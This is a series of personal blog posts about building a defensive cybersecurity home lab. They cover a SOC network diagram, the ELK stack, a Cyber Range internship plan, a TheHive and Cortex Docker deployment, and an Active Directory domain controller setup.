I'm starting with the most fundamental aspect: creating a logical network diagram that will serve as the blueprint for my entire SOC environment.\r\n\r\n\r\n\r\n## Environment Overview\r\n\r\nAt the heart of my SOC environment lies a carefully planned infrastructure consisting of six key servers. The core components include my Elastic Server for comprehensive log aggregation and analysis, paired with a Kibana Server that handles visualization and dashboard creation. To manage my agents effectively, I've incorporated a Fleet Server into the design. Additionally, a C2 Server has been included to facilitate realistic attack scenario simulations, alongside other supporting infrastructure components that complete my robust environment.\r\n\r\n## Implementation Details\r\n\r\nThe implementation process began with draw.io as my diagramming tool of choice. Through careful consideration, I mapped out the complete environment with attention to detail. The process involved strategic placement of each server component within the network topology, ensuring optimal communication paths. I dedicated significant attention to configuring the private network structure and establishing clear data flow connections between components. Special consideration was given to defining security zones and boundaries, ensuring a secure and well-organized infrastructure.\r\n\r\n## Key Insights\r\n\r\nThrough the process of creating this network diagram, I've gained valuable insights into the practical aspects of SOC architecture. Understanding how components interact within a security operations environment has proven crucial, as this setup mirrors real-world scenarios. The exercise has deepened my understanding of data flow patterns and the importance of comprehensive security monitoring coverage. This foundation will prove invaluable as I progress through the challenge.\r\n\r\n## Future Direction\r\n\r\nWhile this network diagram may appear straightforward, it represents the cornerstone of my 30-day journey. This blueprint will guide me through the configuration of monitoring tools, implementation of log forwarding mechanisms, and setup of alert management systems. As I progress, I'll use this foundation to simulate and detect security threats, turning theoretical knowledge into practical experience.\r\n\r\nHere's the link to follow along: [30-Day MYDFIR SOC Analyst Challenge](https://www.youtube.com/watch?v=VAE3aVZi0Go\u0026list=PLG6KGSNK4PuBWmX9NykU0wnWamjxdKhDJ\u0026index=28)\r\n\r\n*Credit: This project was originally created by the MYDFIR YouTube channel.

Together, they form the backbone of log management and analysis, crucial for any Security Operations Center (SOC).\r\n\r\n## Understanding Elasticsearch\r\n\r\nElasticsearch is the heart of the stack. It's a robust search engine that stores and indexes massive amounts of log data. This data can range from Windows event logs to firewall logs and beyond. What makes Elasticsearch particularly valuable is its querying power. It uses Elasticsearch Query Language (ESQL), which allows users to search through large datasets quickly and efficiently. The flexibility of Elasticsearch, especially with its RESTful APIs and JSON support, means you can programmatically interact with it from other tools, enhancing its integration into diverse environments.\r\n\r\n## The Power of Logstash\r\n\r\nNext is Logstash, the powerhouse that processes and transforms incoming data before feeding it into Elasticsearch. Logstash is vital because it allows you to refine your log data, filtering out unnecessary information and only retaining what's critical. This reduces the load on Elasticsearch and helps you manage storage costs more effectively. Additionally, Logstash's ability to parse log fields is a game-changer. For example, you can extract specific details from logs, such as IP addresses, and map them to fields that can be easily queried later. This capability is crucial for security analysts who need to drill down into specific events during investigations.\r\n\r\n## Visualizing with Kibana\r\n\r\nFinally, Kibana is the interface where all the magic happens. It provides a user-friendly web console for querying data stored in Elasticsearch. Beyond simple querying, Kibana's visualization tools enable the creation of detailed dashboards that can display trends, alert patterns, and more. These dashboards are not only useful for real-time monitoring but also for reporting to executives, who often rely on visual data to understand security posture.\r\n\r\n## Conclusion\r\n\r\nThe ELK stack offers centralized logging, customizable data processing, and scalable architecture, making it an essential tool for SOC analysts. Its integration with various telemetry sources and the ability to create visualizations make it a powerful platform for both real-time monitoring and incident response.\r\n\r\nHere's the link to follow along: [30-Day MYDFIR SOC Analyst Challenge](https://www.youtube.com/watch?v=4AwBhXAW90Q\u0026list=PLG6KGSNK4PuBWmX9NykU0wnWamjxdKhDJ\u0026index=29)\r\n\r\n*Credit: This project was originally created by the MYDFIR YouTube channel.

Over the past few months, I have worked extensively on my home lab, documented multiple projects, and sharpened my skills across areas such as SIEM, incident response, and vulnerability management. However, I wanted to push further, especially into the Microsoft security ecosystem, while also gaining structured exposure to premium enterprise tools.\r\n\r\nThat is why I enrolled in the Cyber Range internship program. This platform is built around Microsoft Azure, Microsoft Sentinel, and Microsoft Defender for Endpoint, combined with Tenable for enterprise vulnerability management. It provides a collaborative SOC-like environment where hundreds of analysts work within shared infrastructure that is constantly being targeted by real-world malicious activity. For me, this is not just about learning the basics, it is about refining my skills, testing myself in a live environment, and building familiarity with tools that are at the core of modern enterprise security operations.\r\n\r\n## Getting Started and Building the Foundation\r\n\r\nThe first step in this journey is orientation. The Cyber Range platform begins with a structured roadmap that sets expectations for consistency and growth. Every participant is encouraged to treat it like a real job environment, logging in daily, building habits, and steadily improving. I will begin by following this roadmap, which introduces both theory and practice.\r\n\r\nIn these early weeks, I will revisit fundamental cybersecurity concepts, particularly those aligned with frameworks and compliance regulations. For example, I'll explore how frameworks like NIST or ISO provide the backbone for security controls, and how compliance drivers such as HIPAA or GDPR influence day-to-day security operations. These sessions will serve as a refresher and prepare me for the more technical modules that follow, while also sharpening my understanding of how policy connects to practice.\r\n\r\n## Vulnerability Management with Tenable\r\n\r\nThe first major technical module focuses on vulnerability management, an essential discipline in any cybersecurity program. Using Tenable, I will learn how to scan systems for weaknesses, interpret the findings, and take steps toward remediation.\r\n\r\nThis will involve setting up and running vulnerability scans on virtual machines inside the shared Azure environment, examining the results, and applying patches or configuration changes to reduce risk. For example, if a scan reveals outdated services or missing patches, I'll work through the remediation process just as I would in a real enterprise. Over the coming weeks, my goal is to treat this module not as a checklist, but as a chance to build a workflow: from detection to prioritization, to resolution, and finally verification. Documenting these workflows will be an important part of this project.\r\n\r\n## Threat Hunting, Security Operations, and Incident Response\r\n\r\nThe second technical phase immerses me in the SOC workflow. Here, I will be working with Microsoft Sentinel as the SIEM platform, Defender for Endpoint as the EDR solution, and real log data generated by hundreds of users and systems in the Cyber Range.\r\n\r\nThis is where theory meets practice. Over the next few weeks, I will analyze log flows, craft queries, investigate anomalies, and conduct basic threat hunting. Since the environment is live and exposed to the internet, there will be real attempts by malicious actors to probe and exploit systems. My task will be to detect these attempts, understand their tactics, and respond effectively.\r\n\r\nI will also practice structured incident response. For example, if suspicious activity is detected on a virtual machine, I'll follow response steps: confirming the event, containing the activity, investigating root cause, and documenting lessons learned. This experience mirrors the responsibilities of a SOC analyst and will be central to my learning and documentation.\r\n\r\n## From Learning to Internship Experience\r\n\r\nBeyond the technical labs, the Cyber Range includes a formal internship component. As I progress, I will take on specific tasks that count toward this internship, such as vulnerability scans, incident investigations, and security monitoring activities. Each completed task adds to my record of experience, which can be verified by employers.\r\n\r\nThis part of the program is significant because it transforms the learning journey into something that can be added to a CV and LinkedIn profile as real internship experience. Over the next few weeks, I will treat these tasks as milestones, carefully documenting what I did, how I approached the problem, and what the outcomes were. This will not only strengthen my portfolio but also demonstrate a clear path of professional growth.\r\n\r\n## Conclusion and Next Steps\r\n\r\nProject 5 marks an exciting phase in my cybersecurity journey. Unlike previous projects that focused on building my personal lab, this one places me directly inside a live, collaborative SOC-like environment where the stakes feel real and the tools mirror what enterprises use daily.\r\n\r\nOver the next few weeks, I will document every stage of this process: from foundational refreshers to vulnerability management, from SOC threat hunting to structured incident response, even blogging about theoretical concepts I learn from the platform and finally the internship validation itself. Each update will be posted on this site, showcasing not just the technical steps but also the reflections, challenges, and lessons learned along the way.\r\n\r\nThe ultimate goal is to come out of this experience with practical, verifiable internship experience, sharpened SOC skills, and a portfolio that speaks directly to the expectations of employers. By treating this journey seriously and documenting it transparently, I hope to bridge the gap between learning and professional practice, one step at a time.\r\n\r\n## Important Link\r\n\r\nIf you are interested in joining the Cyber Range community or following along with the labs, you can check it out here: [Cyber Range Community](https://skool.com/cyber-range)\r\n"])</script><script>self.__next_f.push([1,"1b:T150d,"])</script><script>self.__next_f.push([1,"\r\n## Project 4.7: TheHive \u0026 Cortex Deployment in My Cybersecurity Home Lab\r\n\r\n### Overview\r\n\r\nWith the foundation of my segmented cybersecurity home lab steadily taking shape, the next step was to integrate an incident response and analysis layer. For this stage, I deployed TheHive and Cortex, two powerful, open-source tools designed for incident management, case collaboration, and automated analysis.\r\n\r\nThis build forms a critical part of my SOC workflow. TheHive serves as a centralized incident response platform, while Cortex allows for automated enrichment and analysis of observables. Together, they streamline investigations, improve collaboration, and create a more responsive detection and response cycle in my lab environment.\r\n\r\n### Deployment Approach\r\n\r\nWhile TheHive and Cortex can be installed directly on a Linux host or via automated scripts, I opted for a Docker-based deployment through Portainer for speed, maintainability, and container isolation. The process began with pulling the official Docker Compose configuration from TheHive documentation, which includes all required services. TheHive, Cortex, Cassandra, and Elasticsearch pre-configured to work together.\r\n\r\nAfter logging into Portainer, I created a new stack, named it thehive-cortex, pasted in the full Docker Compose configuration, and deployed. Within minutes, the stack creation was successful, and the containers for all components were visible and running.\r\n\r\n### Initial Configuration of TheHive\r\n\r\nAccessing TheHive was straightforward navigating to my lab IP (10.10.30.100:9000) brought up the login page. Using the default credentials (admin@thehive.local / secret), I entered the admin console, where I began configuring the platform for my lab:\r\n\r\n- Created a new organization for my lab environment, representing my segmented network.\r\n- Added a dedicated admin user tied to my internal domain (samson.local), assigning full organization administrator rights.\r\n- Configured a secure password and prepared the account for operational use.\r\n\r\nWhile TheHive offers extensive options for branding, Cortex integration, and case templates, my priority at this stage was preparing the environment to receive alerts from Wazuh, my SIEM/XDR platform deployed earlier in Project 4.3.\r\n\r\n\u003cInlineGallery images={thehive-configuration} title=\"TheHive Initial Configuration and Organization Setup\" /\u003e\r\n\r\n### Cortex Setup\r\n\r\nCortex, accessible on port 9001, was initialized in a similar fashion, logging in with the admin account created earlier and verifying the platform's readiness for analyzer configuration. Cortex will eventually process observables from TheHive cases, performing automated enrichment through analyzers such as VirusTotal, MISP, and WHOIS lookups.\r\n\r\nI held off on detailed analyzer configuration for now, as the immediate focus is ensuring proper alert ingestion from Wazuh into TheHive. This will allow me to establish a case-driven workflow where detection events trigger investigations that are enriched automatically via Cortex.\r\n\r\n\u003cInlineGallery images={cortex-setup} title=\"Cortex Platform Initialization and Configuration\" /\u003e\r\n\r\n### Next Steps in the Workflow\r\n\r\nOnce integration is complete, the workflow will look like this:\r\n\r\n1. Wazuh detects a security event in my lab environment.\r\n2. Alert is forwarded to TheHive, where it appears as a case or alert entry.\r\n3. Cortex automatically enriches observables, providing intelligence for quicker triage.\r\n4. Response actions are documented and executed directly from within TheHive.\r\n\r\nThis aligns with the SOC triage and investigation process used in real-world enterprise environments.\r\n\r\n### Conclusion\r\n\r\n\u003cp class=\"mb-4 leading-relaxed\"\u003eTheHive and Cortex deployment marks the second-to-last stage in the base build of my home lab. The final foundational stage will involve cloud expansion, where I will connect my lab to Azure via a site-to-site VPN. This will extend my testing capabilities, enabling hybrid cloud security monitoring and cross-environment threat detection.\u003c/p\u003e\r\n\r\n\u003cp class=\"mb-4 leading-relaxed\"\u003eOnce integration between Wazuh, TheHive, and Cortex is fully operational, I will move into advanced detection engineering, creating adversary simulations in Caldera, monitoring network telemetry in Security Onion, and refining detection rules across my SOC toolchain.\u003c/p\u003e\r\n\r\n\u003cp class=\"mb-4 leading-relaxed\"\u003eThis project demonstrates the practical implementation of enterprise-grade incident response tools in a home lab environment, showcasing how Docker-based deployments can simplify complex SOC tool integration while maintaining the flexibility needed for custom configurations and testing scenarios.\u003c/p\u003e\r\n\r\n\u003cp class=\"mb-4 leading-relaxed\"\u003e\u003cstrong class=\"font-semibold\"\u003eCredits:\u003c/strong\u003e This walkthrough is based on Episode 6 of the Ultimate Cybersecurity Lab YouTube series by Gerard O'Brien.

This step was crucial in establishing centralized authentication, DNS, DHCP, and Group Policy management within my segmented VLAN architecture. Following the structure of Gerard O'Brien's Building the Ultimate Cybersecurity Lab series, Episode 5, I adapted the process to fit my lab's unique VLAN assignments, IP addressing, and Proxmox-based virtualization environment. The result was a functional Windows Server Active Directory environment, complete with user accounts, security groups, DHCP migration, and automated drive mapping, all verified through a successful workstation domain join.\r\n\r\n### Building the Windows Server 2022 Domain Controller\r\n\r\nI began by provisioning a new virtual machine in Proxmox to host the domain controller. The VM was configured with Windows Server 2022 Standard (Desktop Experience) and allocated resources sufficient for Active Directory and supporting services. The network interface was connected to my vmbr0 bridge with VLAN 20 tagging to ensure isolation within the lab's network segmentation.\r\n\r\nDuring installation, the Windows setup process initially failed to detect any storage devices. This was due to the absence of necessary VirtIO drivers in the Windows installation media. To resolve this, I attached an additional virtual CD-ROM containing the VirtIO ISO, loaded the appropriate viostor driver for Windows Server 2022, and proceeded with the installation once the 64GB virtual disk became visible.\r\n\r\nAfter completing the installation and setting the initial administrator password, I confirmed that the server had obtained an IP address from my OPNsense firewall. I then reconfigured the NIC with a static IP of **10.10.20.10**, set the gateway to **10.10.20.254**, and assigned DNS to Google's public resolvers. The hostname was updated to Prod-DomainController and the server was rebooted to apply these changes.\r\n\r\nWith networking finalized, I launched Server Manager and used the \"Add Roles and Features\" wizard to install Active Directory Domain Services, DNS Server, and DHCP Server. The server was then promoted to a domain controller, creating a new forest with the domain name **samson.local** and a forest functional level set to Windows Server 2016.\r\n\r\n\u003cInlineGallery images={windows-server-deployment} title=\"Windows Server 2022 Domain Controller Deployment\" /\u003e\r\n\r\n### User and Group Configuration\r\n\r\nOnce Active Directory was operational, I opened Active Directory Users and Computers (ADUC) and created a security group named \"Shared Folder Access,\" intended to control which users would automatically receive mapped network drives. I then created two accounts: a standard user account for workstation logins and a domain administrator account named SOAdmin, which was added to the Domain Admins group.\r\n\r\n\u003cInlineGallery images={user-group-configuration} title=\"User and Group Configuration in Active Directory\" /\u003e\r\n\r\n### Migrating DHCP from the Firewall to the Domain Controller\r\n\r\nPrior to this stage, DHCP for VLAN 20 was provided by my OPNsense firewall. To consolidate network services within the domain, I logged into OPNsense, disabled DHCP on VLAN 20, and configured a new DHCP scope on the domain controller. The scope covered IP addresses from **10.10.20.100** to **10.10.20.120**, used a subnet mask of **255.255.255.0**, and specified the default gateway as **10.10.20.254**. The domain controller itself was designated as the primary DNS server. This migration ensured that devices on VLAN 20 would now obtain addressing directly from Active Directory-integrated DHCP.\r\n\r\n\u003cInlineGallery images={dhcp-migration} title=\"DHCP Migration from Firewall to Domain Controller\" /\u003e\r\n\r\n### Implementing Group Policy for Drive Mapping\r\n\r\nTo automate network drive assignments for authorized users, I used Group Policy Management to create a new GPO named \"Map Network Drive.\" Under User Configuration → Preferences → Windows Settings → Drive Maps, I configured the policy to connect a G: drive to a shared folder on the domain controller. Item-Level Targeting was enabled so that only members of the \"Shared Folder Access\" security group would receive this mapping.\r\n\r\nThe shared folder itself was configured in the server's file system with full control permissions granted for the purposes of lab testing, acknowledging that in a production scenario, permissions would be far more restrictive.\r\n\r\n\u003cInlineGallery images={group-policy-drive-mapping} title=\"Group Policy Drive Mapping Configuration\" /\u003e\r\n\r\n\u003cInlineGallery images={group-policy-configuration} title=\"Group Policy and DHCP Configuration\" /\u003e\r\n\r\n### Deploying and Joining the Windows 10 Workstation\r\n\r\nThe Windows 10 desktop was provisioned in Proxmox with a network interface on VLAN 20 to ensure DHCP and domain connectivity. As with the domain controller installation, the Windows 10 setup required VirtIO storage drivers, which were loaded from an attached VirtIO ISO before installation could proceed.\r\n\r\nFollowing setup, I confirmed that the workstation received an IP address from the domain controller's DHCP service. I then joined the machine to the **Samson.local** domain by entering the domain name in the System Properties dialog and authenticating with the GEAdmin account. Upon reboot, the \"Other User\" option was used to log in with the standard domain account created earlier.\r\n\r\nThe login was successful, and as expected, the Group Policy applied automatically, mapping the G: drive to the shared folder on the domain controller. This confirmed that the domain join process was working correctly and that both DHCP and GPO-driven resource mapping were functioning as intended.\r\n\r\n\u003cInlineGallery images={windows-10-domain-join} title=\"Windows 10 Workstation Domain Integration\" /\u003e\r\n\r\n### Conclusion\r\n\r\n\u003cp class=\"mb-4 leading-relaxed\"\u003eAt this stage, my lab's Windows Server 2022 domain controller and Windows 10 workstation were fully integrated into a functioning Active Directory environment. The deployment included successful configuration of DNS and DHCP, migration of DHCP services from the firewall to the DC, creation of security groups and user accounts, and verification of Group Policy-based resource mapping.\u003c/p\u003e\r\n\r\n\u003cp class=\"mb-4 leading-relaxed\"\u003eThis project demonstrates the practical challenges of deploying a Windows domain in a segmented lab network, including overcoming storage driver issues in Proxmox, ensuring proper IP configuration, and managing DHCP migration. These foundational services are now in place to support centralized authentication, resource access control, and further SOC tool integrations in later stages.\u003c/p\u003e\r\n\r\n\u003cp class=\"mb-4 leading-relaxed\"\u003eStay tuned for the next stage of this project, where these Windows systems will be integrated with other monitoring and detection tools such as Wazuh, Security Onion, and Caldera, forming a complete security operations workflow within the lab.\u003c/p\u003e\r\n\r\n\u003cp class=\"mb-4 leading-relaxed\"\u003e\u003cstrong class=\"font-semibold\"\u003eCredits:\u003c/strong\u003e This walkthrough is based on Episode 5 of the Ultimate Cybersecurity Lab YouTube series by Gerard O'Brien.
